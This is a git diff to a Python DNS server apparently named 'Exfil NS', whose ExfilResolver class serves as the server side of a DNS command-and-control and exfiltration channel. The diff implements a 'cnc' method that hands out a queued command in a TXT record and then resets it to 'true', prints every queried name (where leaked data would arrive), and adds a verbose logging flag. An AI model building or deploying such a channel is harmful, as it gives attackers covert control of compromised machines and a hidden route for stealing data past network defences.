@@ -82,11 +82,13 @@ class ExfilResolver(BaseResolver):
             return reply
 
 
-    # unimplemented
     def cnc(self, request, qname):
         reply = request.reply()
+
+        print(qname)
         
         reply.add_answer(RR(request.q.qname, QTYPE.TXT, ttl=self.ttl, rdata=TXT(self.cmd)))
+        self.cmd = "true"
 
         return reply
 
@@ -161,13 +163,19 @@ if __name__ == '__main__':
     import argparse,sys,time
 
     p = argparse.ArgumentParser(description="Exfil NS")
+    p.add_argument("-v","--verbose",default=True,metavar="<verbose")
     p.add_argument("--origin","-o",required=True,
                     metavar="<origin>",
                     help="Origin domain label (Ex: example.com)")
     args = p.parse_args()
 
     resolver = ExfilResolver(args.origin,"60s")
-    logger = DNSLogger("-reply",False)
+    
+    if args.verbose:
+        logger = DNSLogger("",False)
+    else:
+        logger = DNSLogger("-response,-reply",False)
+        
 
     udp_server = DNSServer(resolver, address="0.0.0.0", logger=logger)
     udp_server.start_thread()
